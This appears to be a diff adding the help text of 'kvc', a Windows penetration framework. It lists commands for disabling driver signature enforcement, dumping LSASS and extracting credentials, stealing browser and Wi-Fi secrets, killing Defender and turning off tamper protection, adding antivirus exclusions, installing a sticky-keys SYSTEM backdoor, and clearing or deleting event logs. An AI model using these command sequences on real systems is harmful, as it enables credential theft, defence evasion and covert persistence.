@@ -1,0 +1,459 @@
+
+================================================================================
+                        Marek Wesolowski - WESMAR - 2026
+                         kvc.exe v1.0.5 https://kvc.pl
+                    +48 607-440-283, marek@wesolowski.eu.org
+               kvc - Kernel Vulnerability Capabilities Framework
+        Comprehensive Windows Security Research & Penetration Framework
+     Features Process Protection, DPAPI Extraction, Defender Bypass & More
+================================================================================
+
+Usage: {program} <command> [arguments]
+
+=== Service Management Commands (Advanced Scenarios) ===
+  setup                                             - Decrypt and deploy combined binary components from kvc.dat
+  install                                           - Install kvc as NT service with TrustedInstaller privileges
+  uninstall                                         - Remove NT service + BootExecute entry + drivers.ini (full cleanup)
+  uninstall smss                                    - Remove only SMSS boot loader (BootExecute + drivers.ini, keep service)
+  service start                                     - Start the Kernel Vulnerability Capabilities Framework service
+  service stop                                      - Stop the Kernel Vulnerability Capabilities Framework service
+  service status                                    - Check service status
+
+=== SMSS Boot-Phase Driver Loader ===
+  install <driver>                                  - Register driver for early SMSS boot loading (auto-resolves System32\drivers\)
+  install <driver.sys>                              - Same - .sys extension optional
+  install --pdb <driver>                            - Same + pre-resolve offsets from PDB symbols (skips boot-time scan)
+  Writes entry to C:\Windows\drivers.ini (UTF-16, AutoPatch=YES)
+  Adds kvc_smss.exe to BootExecute: autocheck autochk * \0 kvc_smss
+  Default: no offsets written - kvc_smss heuristic scanner resolves at boot (always fresh)
+  --pdb: resolves SeCiCallbacks/ZwFlushInstructionCache via PDB, writes to INI (OffsetSource=PDB)
+  --pdb fallback: if PDB lookup fails, scanner runs at boot anyway
+  --pdb caveat: stale after Windows update - re-run install or drop --pdb to revert to scanner
+  kvc_smss runs before services.exe, before antivirus user-mode components
+  DSE bypass sequence: kvc.sys (DriverStore) -> patch -> load target -> restore -> unload
+  Verbose=YES in drivers.ini: screen output during boot; NO: silent (check via sc query)
+
+=== Driver Signature Enforcement (DSE) Control ===
+  dse off                                           - Disable DSE (Standard: g_CiOptions or HVCI bypass)
+  dse off --safe                                    - Disable DSE (Next-Gen: SeCiCallbacks + PDB symbols)
+  dse on                                            - Restore DSE (Standard method)
+  dse on --safe                                     - Restore DSE (Next-Gen method)
+  dse                                               - Check current DSE status (both methods)
+  Standard method: Modifies g_CiOptions or prepares HVCI bypass
+  --safe method: Patches SeCiCallbacks using PDB symbols
+  --safe requires Internet on first run to download kernel symbols
+  --safe is PatchGuard-resistant on modern Win10/11
+  Both methods store state in HKEY_CURRENT_USER\Software\kvc\DSE
+  Symbols cached locally in .\symbols\ for offline use
+
+=== External Driver Loading (Auto DSE Bypass) ===
+  driver load <path>                                - Load unsigned driver (Patch -> Start -> Unpatch)
+  driver load <path> -s <0-4>                       - Load with specific StartType (0=Boot,1=System,2=Auto,3=Demand,4=Disabled)
+  driver reload <n>                                 - Reload driver (Stop -> Patch -> Start -> Unpatch)
+  driver stop <n>                                   - Stop driver service (no delete)
+  driver remove <n>                                 - Stop and delete driver service
+  Path can be full (C:\test.sys) or short name (test -> System32\drivers\test.sys)
+  Uses Next-Gen DSE bypass (SeCiCallbacks) - PatchGuard resistant
+  DSE is automatically restored after driver loads
+
+=== Memory Dumping Commands ===
+  dump <PID|process_name> [path]                    - Create comprehensive memory dump
+  Default output: Downloads folder. Custom path: 'kvc dump lsass C:\dumps'
+  After lsass dump: offered immediate credential analysis via KvcForensic
+  MsMpEng dump only works with Defender disabled (otherwise Ctrl+C)
+
+=== Process Information Commands ===
+  list                                              - List all protected processes with color coding
+  list --gui                                        - Launch interactive GUI mode for process management
+  get <PID|process_name>                            - Get protection status of specific process
+  info <PID|process_name>                           - Get detailed process info including dumpability
+
+=== Module Enumeration Commands ===
+  modules <PID|process_name>                        - List all loaded modules in target process (alias: mods)
+  modules <PID> read <module>                       - Read first 256 bytes from module (PE header)
+  modules <PID> read <module> <offset>              - Read 256 bytes from specified offset
+  modules <PID> read <module> <offset> <size>       - Read custom size (max 4096 bytes)
+  Module name supports partial matching: 'ntdll' finds 'ntdll.dll'
+  Offset accepts decimal or hex (0x prefix): 0x1000 or 4096
+  Uses kernel driver for protected process memory access
+
+=== Process Termination Commands ===
+  kill <PID|process_name>                           - Terminate process with automatic protection elevation
+  kill <PID1,PID2,name3>                            - Terminate multiple processes (comma-separated)
+  Primary: kvc.sys kernel primitive (KillProcessInternal)
+  Fallback: kvckiller.sys (K7RKScan service, digitally signed) - kills any PP/PPL, no restart needed
+  Exe path cached at kill time; 'kvc restore <name>' can relaunch the process
+  Supports process names: 'kill total' terminates Total Commander
+  Case-insensitive partial matching: 'notepad' matches 'notepad.exe'
+
+=== Process Protection Commands ===
+  set <PID|process_name> <PP|PPL> <TYPE>            - Set protection (force, ignoring current state)
+  protect <PID|process_name> <PP|PPL> <TYPE>        - Protect unprotected process
+  unprotect <PID|process_name|SIGNER>               - Remove protection from process(es)
+  unprotect all                                     - Remove protection from ALL processes
+  unprotect <PID1,PID2,PID3>                        - Remove protection from multiple processes
+  set-signer <SIGNER> <PP|PPL> <NEW_SIGNER>         - Batch modify protection for all processes of specific signer
+  list-signer <SIGNER>                              - List all processes with specific signer
+  restore <signer_name|process_name>                - Restore PPL state or relaunch killed process
+  restore all                                       - Restore all saved protection states
+  history                                           - Show saved session history (max 16 sessions)
+  cleanup-sessions                                  - Delete all sessions except current
+  SIGNER can be: Antimalware, WinTcb, Windows, Lsa, WinSystem, etc.
+
+=== Session Management System ===
+  - Automatic boot detection and session tracking (max 16 sessions)
+  - Each 'unprotect' operation saves process states grouped by signer
+  - 'restore' commands reapply protection from saved session state
+  - Session history persists across reboots until limit reached
+  - Oldest sessions auto-deleted when exceeding 16 session limit
+  - Manual cleanup available via 'cleanup-sessions' command
+  - Status tracking: UNPROTECTED (after unprotect) -> RESTORED (after restore)
+
+=== System Integration Commands ===
+  shift                                             - Install sticky keys backdoor (5x Shift = SYSTEM cmd)
+  unshift                                           - Remove sticky keys backdoor
+  trusted <command>                                 - Run command with elevated system privileges
+  install-context                                   - Add context menu entries for right-click access
+  evtclear                                          - Clear all primary system event logs (Application, Security, Setup, System)
+
+=== Registry Backup & Defragmentation ===
+  registry backup                                   - Backup all registry hives to Downloads
+  registry backup C:\backup                         - Backup to custom directory
+  registry restore C:\backup                        - Restore hives from backup
+  registry defrag                                   - Defragment registry (backup+compact)
+  Backs up: BCD, SAM, SECURITY, SOFTWARE, SYSTEM, NTUSER, etc.
+  Default path: Downloads\Registry_Backup_YYYYMMDD_HHMMSS
+  Defrag compacts hives through RegSaveKeyEx (no fragmentation)
+
+=== Browser Password Extraction Commands ===
+  browser-passwords                                 - Extract Chrome passwords (default)
+  bp --chrome                                       - Extract Chrome passwords explicitly
+  bp --brave                                        - Extract Brave browser passwords
+  bp --edge                                         - Extract Edge browser passwords
+  bp --all                                          - Extract from all installed browsers
+  bp --output C:\reports                            - Custom output directory
+  bp --edge -o C:\data                              - Edge passwords to custom path
+  Requires kvc_pass.exe for Chrome/Brave/All
+  Edge with kvc_pass: JSON + cookies + HTML/TXT reports (full extraction)
+  Edge without kvc_pass: HTML/TXT reports only (built-in DPAPI fallback)
+
+=== Enhanced Windows Defender Exclusion Management ===
+  add-exclusion <path>                              - Add file/folder to exclusions (legacy syntax)
+  add-exclusion Paths <path>                        - Add specific path to exclusions
+  add-exclusion Processes <n>                       - Add process to exclusions
+  add-exclusion Extensions <ext>                    - Add file extension to exclusions
+  add-exclusion IpAddresses <ip>                    - Add IP address/CIDR to exclusions
+  remove-exclusion [TYPE] <value>                   - Remove exclusion (same syntax as add)
+  When no path specified, adds current program to both Paths and Processes
+
+=== Security Engine Management ===
+  secengine disable                                 - kill MsMpEng/SecurityHealthSystray/SecurityHealthService
+  secengine enable                                  - Remove IFEO block, start WinDefend/SecurityHealthService
+  secengine status                                  - Show IFEO block / service / process state
+  Offline IFEO hive edit - bypasses DACL on protected registry keys
+  disable: IFEO set on 3 targets, then kvckiller.sys kills running processes immediately
+  disable: kvckiller.sys is digitally signed - no HVCI restart, no DSE bypass needed
+  disable: MsMpEng.exe + SecurityHealthSystray via IOCTL; SecurityHealthService via SCM stop
+  enable:  WinDefend + SecurityHealthService started via SCM; MsMpEng.exe up within seconds
+
+=== Windows Defender UI Automation ===
+  rtp on                                            - Enable Real-Time Protection
+  rtp off                                           - Disable Real-Time Protection
+  rtp status                                        - Check Real-Time Protection status
+  tp on                                             - Enable Tamper Protection
+  tp off                                            - Disable Tamper Protection
+  tp status                                         - Check Tamper Protection status
+  Uses ghost mode (invisible window, UAC bypass, pre-warming)
+  Fully automated - no user interaction required
+
+=== DPAPI Secrets Extraction Commands ===
+  export secrets [path]                             - Extract browser & WiFi secrets using TrustedInstaller
+  Default path is the Downloads folder - simple: 'kvc export secrets'
+  Extracts Chrome, Edge passwords + WiFi credentials + master keys
+
+=== Watermark Management ===
+  watermark remove                                  - Remove Windows desktop watermark (alias: wm remove)
+  watermark restore                                 - Restore Windows desktop watermark (alias: wm restore)
+  watermark status                                  - Check current watermark status (alias: wm status)
+  Hijacks ExplorerFrame.dll via registry redirection
+  Requires Administrator privileges and TrustedInstaller access
+
+=== UnderVolter - EFI Undervolting Module ===
+  undervolter deploy                                - Decrypt UnderVolter.dat and write EFI files to ESP
+  undervolter remove                                - Restore backed-up BOOTX64.EFI, remove EFI\UnderVolter\
+  undervolter status                                - Check whether UnderVolter is deployed on the EFI partition
+  Requires UnderVolter.dat in current directory or System32
+  Build UnderVolter.dat: KvcXor.exe option 6 (Loader.efi + UnderVolter.efi + UnderVolter.ini)
+  Deploy mode A: replaces \EFI\BOOT\BOOTX64.EFI (original backed up as BOOTX64.efi.bak)
+  Deploy mode B: copies to \EFI\UnderVolter\ only - add UEFI boot entry manually
+
+=== Forensic Analysis - KvcForensic Module ===
+  analyze <dump.dmp>                                - Analyze minidump - extract credentials (MSV/WDigest/Kerberos/TSPKG)
+  analyze <dump.dmp> --format txt|json|both         - Output format (default: both)
+  analyze <dump.dmp> --full                         - Include metadata header in text report
+  analyze <dump.dmp> --tickets <dir>                - Export Kerberos tickets as .kirbi + .ccache
+  analyze lsass                                     - Find most recent lsass dump (CWD or Downloads) and analyze
+  analyze --gui                                     - Open KvcForensic in GUI mode (drag-and-drop interface)
+  Output files written alongside the dump (.txt / .json, same directory)
+  Requires kvcforensic.dat - place in CWD and run 'kvc setup', or copy to System32
+  Build kvcforensic.dat: KvcXor.exe option 7 (KvcForensic.exe + KvcForensic.json)
+  'kvc dump lsass' offers immediate analysis after successful dump
+
+=== Entertainment ===
+  --tetris                                          - Launch classic Tetris game (x64 assembly)
+  Arrow keys to move/rotate, Space for hard drop, P to pause
+  Press F2 to start new game, ESC to exit
+
+=== Filesystem Blocker (kvcblocker.sys) ===
+  lock --gui                                        - Open VaultGuard protection GUI
+  lock --tray                                       - Open VaultGuard GUI minimized to tray
+  lock status                                       - Driver status: active, path count, trusted count
+  lock on                                           - Enable filesystem protection globally
+  lock off                                          - Disable filesystem protection globally
+  lock add <path> <mode>                            - Protect folder (Hidden|Locked|ReadOnly|NoExec|All)
+  lock remove <path>                                - Remove folder from protection
+  lock allow <app.exe>                              - Add process to bypass list (case-insensitive)
+  lock unallow <app.exe>                            - Remove process from bypass list
+  lock list                                         - Show driver status and counts
+  lock clear                                        - Remove all protected paths and trusted entries
+  Kernel minifilter driver (FSFilter Content Screener)
+  Service: clrcd  |  Device: BE79F7D8-53E6-4308-9D51-EDCDA79805C4
+  Driver deployed by 'kvc list' or automatically on first 'kvc lock' command
+  Protection modes: Hidden=hide from shell, Locked=block all writes,
+    ReadOnly=block writes allow reads, NoExec=block execution
+
+=== ForceIO File Operations (forceio.sys) ===
+  locks <path>                                      - Show processes locking a file (supports * and ?)
+  delete <path>                                     - Force-delete file or directory (supports * and ?)
+  rename <source> <destination>                     - Force-rename or move file or directory
+  copy <source> <destination>                       - Force-copy file or directory
+  Uses the WHCP-signed IObitUnlocker.sys driver through the IObitUnlocker service
+  The driver is loaded for the operation and removed after completion
+  Wildcards are supported in the final path component only
+  Existing destinations are rejected by copy and rename
+  Requires Administrator privileges
+
+=== Protection Types ===
+  PP  - Protected Process (highest protection level)
+  PPL  - Protected Process Light (medium protection level)
+
+=== Signer Types ===
+  Authenticode  - Standard code signing authority
+  CodeGen       - Code generation process signing
+  Antimalware   - Antimalware vendor signing (for security software)
+  Lsa           - Local Security Authority signing
+  Windows       - Microsoft Windows component signing
+  WinTcb        - Windows Trusted Computing Base signing
+  WinSystem     - Windows System component signing
+  App           - Application store signing
+
+=== Exclusion Types ===
+  Paths         - File/folder paths (C:\malware.exe, C:\temp\)
+  Processes     - Process names (malware.exe, cmd.exe)
+  Extensions    - File extensions (.exe, .dll, .tmp)
+  IpAddresses   - IP addresses/CIDR (192.168.1.1, 10.0.0.0/24)
+
+=== Process Name Matching ===
+  - Exact match: 'explorer', 'notepad'
+  - Partial match: 'total' matches 'totalcmd64'
+  - Wildcards: 'total*' matches 'totalcmd64.exe'
+  - Case insensitive matching supported
+  - Multiple matches require more specific patterns
+
+=== TrustedInstaller Features ===
+  - Executes commands with maximum system privileges
+  - Supports .exe files and .lnk shortcuts automatically
+  - Adds convenient context menu entries
+  - Enhanced Windows Defender exclusion management
+
+=== Technical Features ===
+  - Dynamic kernel driver loading (no permanent installation)
+  - Embedded encrypted driver with steganographic protection
+  - Automatic privilege escalation for memory dumping
+  - Complete cleanup on exit (no system traces)
+  - Advanced process pattern matching
+  - Color-coded process protection visualization
+  - IFEO sticky keys backdoor with Defender bypass
+  - Self-protection capabilities for advanced scenarios
+  - Comprehensive Windows Defender exclusion management
+
+=== SMSS Boot Loader (kvc_smss.exe) ===
+  - Native application (SUBSYSTEM:NATIVE) - runs in SMSS phase before Winlogon
+  - Registered via BootExecute: executes after autocheck autochk *
+  - DSE bypass using kvc.sys from DriverStore (no embedded vulnerable driver)
+  - INI-driven: C:\Windows\drivers.ini controls all operations declaratively
+  - Supports LOAD, UNLOAD, RENAME, DELETE operations in configurable order
+  - HVCI detection: patches SYSTEM hive directly if Memory Integrity is active
+  - Verbose=NO for silent boot - no screen output, verify via sc query
+  - Default: heuristic scanner resolves offsets at boot (Fast->Structural->Legacy)
+  - Optional --pdb flag pre-writes offsets from symbols; stale after Windows Update
+
+=== Defender Exclusion Notes ===
+  Defender exclusions use the WMI MSFT_MpPreference COM interface (root\Microsoft\Windows\Defender).
+  Extensions: Automatically adds leading dot if missing (.exe, not exe)
+  Processes: Extracts filename from full path if provided
+  IpAddresses: Supports CIDR notation (192.168.1.0/24)
+  Self-protection: When no arguments, adds to both Paths and Processes
+  Legacy syntax (kvc add-exclusion file.exe) still works for compatibility
+
+=== Sticky Keys Backdoor Features ===
+  - Press 5x Shift on login screen to get SYSTEM cmd.exe
+  - Works without login or active session
+  - Bypasses Windows Defender with process exclusions
+  - Uses Image File Execution Options (IFEO) technique
+  - Complete cleanup with 'unshift' command
+
+=== Sticky Keys Backdoor Notes ===
+  After 'kvc shift', press 5x Shift on Windows login screen to get cmd.exe.
+  The cmd runs with SYSTEM privileges without requiring login.
+  Defender process exclusions prevent detection of cmd.exe activity.
+  Use 'kvc unshift' to completely remove all traces.
+  This technique works on Windows 7-11, including Server editions.
+
+=== Undumpable System Processes ===
+  - System (PID 4)           - Windows kernel process
+  - Secure System (PID 188)  - VSM/VBS protected process
+  - Registry (PID 232)       - Kernel registry subsystem
+  - Memory Compression       - Kernel memory manager
+  - [Unknown] processes      - Transient kernel processes
+
+=== Usage Examples ===
+  kvc list                                                    # Show all protected processes
+  kvc list --gui                                              # Launch interactive GUI for visual management
+  kvc info lsass                                              # Detailed info with dumpability analysis
+  kvc protect 1044 PPL Antimalware                            # Protect process with PPL-Antimalware
+  kvc set 5678 PP Windows                                     # Force set PP-Windows protection
+  kvc spoof 1044 37 07                                        # Spoof process signatures (EXE: 0x37, DLL: 0x07)
+  kvc unprotect lsass                                         # Remove protection from LSASS
+  kvc unprotect 1,2,3,lsass                                   # Batch unprotect multiple targets
+  kvc unprotect Antimalware                                   # Remove protection from all Antimalware processes
+  kvc unprotect all                                           # Remove protection from ALL processes (grouped by signer)
+  kvc set-signer Antimalware PPL WinTcb                       # Change all Antimalware processes to PPL-WinTcb
+  kvc set-signer Windows PP Antimalware                       # Escalate all Windows processes to PP-Antimalware
+  kvc history                                                 # Show saved sessions (max 16, with status tracking)
+  kvc restore Antimalware                                     # Restore PPL for Antimalware group
+  kvc restore msmpeng                                         # Relaunch MsMpEng.exe killed via kvc kill
+  kvc restore all                                             # Restore all saved protection states from this session
+  kvc cleanup-sessions                                        # Delete all old sessions (keep only current)
+  kvc kill 1234                                               # Terminate process with PID 1234
+  kvc kill total                                              # Terminate Total Commander by name
+  kvc kill 1234,5678,9012                                     # Terminate multiple processes
+  kvc kill lsass                                              # Terminate protected process (auto-elevation)
+  kvc dump lsass C:\dumps                                     # Dump LSASS to specific folder
+  kvc dump 1044                                               # Dump PID 1044 to Downloads folder
+  kvc modules explorer.exe                                    # List all modules loaded in Explorer
+  kvc mods lsass                                              # List LSASS modules (auto-elevates for protected)
+  kvc modules 1220                                            # List modules by PID
+  kvc modules explorer read ntdll                             # Read PE header (256 bytes) from ntdll.dll
+  kvc mods lsass read lsasrv 0x1000                           # Read 256 bytes at offset 0x1000
+  kvc modules 1234 read kernel32 0 512                        # Read 512 bytes from module start
+  kvc install                                                 # Install kvc as NT service
+  kvc service start                                           # Start the service
+  kvc service stop                                            # Stop the service
+  kvc uninstall                                               # Full cleanup: service + BootExecute + drivers.ini
+  kvc uninstall smss                                          # Remove only SMSS boot loader (keep NT service)
+  kvc install omnidriver                                      # Register omnidriver.sys for SMSS boot loading
+  kvc install --pdb omnidriver                                # Same + pre-resolve offsets via PDB
+  kvc install omnidriver.sys                                  # Same - .sys extension optional
+  kvc install kvcstrm                                         # Register kvcstrm for early load (before AV user-mode)
+  kvc dse off                                                 # Disable DSE to load unsigned drivers
+  kvc dse off --safe                                          # Disable DSE (Next-Gen PDB method)
+  kvc dse on                                                  # Re-enable DSE for system security
+  kvc dse on --safe                                           # Re-enable DSE (Next-Gen method)
+  kvc dse                                                     # Check current DSE status
+  kvc driver load kvckbd                                      # Load driver from System32\drivers\kvckbd.sys
+  kvc driver load C:\test\mydriver.sys                        # Load driver from full path
+  kvc driver load kvckbd -s 1                                 # Load with StartType=SYSTEM
+  kvc driver reload kvcstrm                                   # Reload driver (stop -> patch -> start -> unpatch)
+  kvc driver stop mydriver                                    # Stop driver service (no delete)
+  kvc driver remove mydriver                                  # Stop and delete driver service
+  kvc wm status                                               # Check if watermark is removed or active
+  kvc wm remove                                               # Remove Windows desktop watermark
+  kvc wm restore                                              # Restore original Windows watermark
+  kvc watermark remove                                        # Full command syntax (same as 'wm remove')
+  kvc undervolter status                                      # Check if UnderVolter is deployed on EFI partition
+  kvc undervolter deploy                                      # Deploy UnderVolter.dat to EFI partition (interactive)
+  kvc undervolter remove                                      # Remove UnderVolter from EFI partition, restore backup
+  kvc shift                                                   # Install sticky keys backdoor
+  kvc unshift                                                 # Remove sticky keys backdoor
+  kvc trusted cmd                                             # Run command as TrustedInstaller
+  kvc trusted "C:\app.exe" --arg                              # Run application with arguments
+  kvc install-context                                         # Add right-click menu entries
+  kvc add-exclusion Processes kvc.exe                         # Add process to exclusions (manual)
+  kvc add-exclusion C:\malware.exe                            # Add specific file to exclusions
+  kvc add-exclusion Paths C:\temp                             # Add folder to path exclusions
+  kvc add-exclusion Processes cmd.exe                         # Add process to exclusions
+  kvc add-exclusion Extensions .tmp                           # Add extension to exclusions
+  kvc add-exclusion IpAddresses 1.1.1.1                       # Add IP to exclusions
+  kvc remove-exclusion Processes cmd.exe                      # Remove process exclusion
+  kvc secengine status                                        # IFEO block / WinDefend / MsMpEng state
+  kvc secengine disable                                       # IFEO block + kill all 3 Defender targets via kvckiller
+  kvc secengine enable                                        # Remove IFEO block, start WinDefend + SecurityHealthService
+  kvc rtp status                                              # Check Real-Time Protection status
+  kvc rtp off                                                 # Disable Real-Time Protection (ghost mode)
+  kvc rtp on                                                  # Enable Real-Time Protection
+  kvc tp status                                               # Check Tamper Protection status
+  kvc tp off                                                  # Disable Tamper Protection (ghost mode)
+  kvc tp on                                                   # Enable Tamper Protection
+  kvc export secrets                                          # Export secrets to Downloads folder
+  kvc export secrets C:\reports                               # Export secrets to specific folder
+  kvc registry backup                                         # Backup all hives to Downloads
+  kvc registry backup C:\backup                               # Backup to custom directory
+  kvc registry restore C:\backup\Registry_Backup_*            # Restore from backup
+  kvc registry defrag                                         # Defragment registry (backup+restore)
+  kvc locks C:\Temp\locked.log                                # Show processes locking a file
+  kvc locks C:\Temp\*.log                                     # Show lock owners for matching files
+  kvc delete c:\Windows\system32\winevt\Logs\*.evtx           # Delete matching files
+  kvc delete "C:\Temp\capture??.log"                          # Delete files matching two-character pattern
+  kvc rename C:\Temp\locked.log C:\Temp\locked.old            # Rename or move a file
+  kvc copy C:\Windows\System32\config\SAM C:\Temp\SAM         # Copy a file
+  kvc bp --edge                                               # Edge only (works standalone, no kvc_pass needed)
+  kvc bp --chrome                                             # Chrome only (requires kvc_pass.exe)
+  kvc bp --brave                                              # Brave only (requires kvc_pass.exe)
+  kvc bp --all                                                # Extract all browsers (requires kvc_pass.exe)
+  kvc bp --edge -o C:\passwords                               # Edge with custom output directory
+  kvc --tetris                                                # Take a break and play Tetris
+
+=== SECURITY & LEGAL NOTICE ===
+  WARNING: POWERFUL SECURITY RESEARCH TOOL - USE RESPONSIBLY
+
+  CAPABILITIES & REQUIREMENTS:
+  - Kernel driver manipulation with advanced memory access techniques
+  - DPAPI secret extraction (browser passwords, WiFi credentials, certificates)
+  - Windows Defender bypass and exclusion management
+  - System persistence mechanisms (sticky keys backdoor, IFEO techniques)
+  - TrustedInstaller privilege escalation and system-level operations
+  - Process protection manipulation and memory dumping
+  - Registry modifications and service installation capabilities
+
+  TECHNICAL IMPLEMENTATION:
+  - Embedded encrypted kernel driver with steganographic protection
+  - Dynamic driver loading - temporary deployment with automatic cleanup
+  - Administrator privileges required for all security operations
+  - Most operations leave no permanent traces except when explicitly requested
+  - Some commands (shift, install, add-exclusion) make persistent changes
+  - These changes are reversible (via unshift, remove-exclusion, etc.)
+
+  LEGAL & ETHICAL RESPONSIBILITY:
+  - Intended for authorized penetration testing and security research only
+  - User assumes full legal responsibility for all actions performed
+  - Ensure proper authorization before using on any system
+  - Misuse may violate computer crime laws in your jurisdiction
+  - This tool can modify system security settings and extract sensitive data
+
+  PROFESSIONAL USE GUIDELINES:
+  - Document all activities for security assessments
+  - Use 'unshift' and 'remove-exclusion' commands to clean up after testing
+  - Verify system state before and after testing
+  - Report findings through appropriate responsible disclosure channels
+
+  By using this tool, you acknowledge understanding and accept full responsibility.
+
++------------------------------------------------------------------------------+
+|        Support this project - a small donation is greatly appreciated        |
+|                  and helps sustain private research builds.                  |
+|              GitHub source code: https://github.com/wesmar/kvc/              |
+|                Professional services: marek@wesolowski.eu.org                |
+|          PayPal: paypal.me/ext1        Revolut: revolut.me/marekb92          |
++------------------------------------------------------------------------------+
+
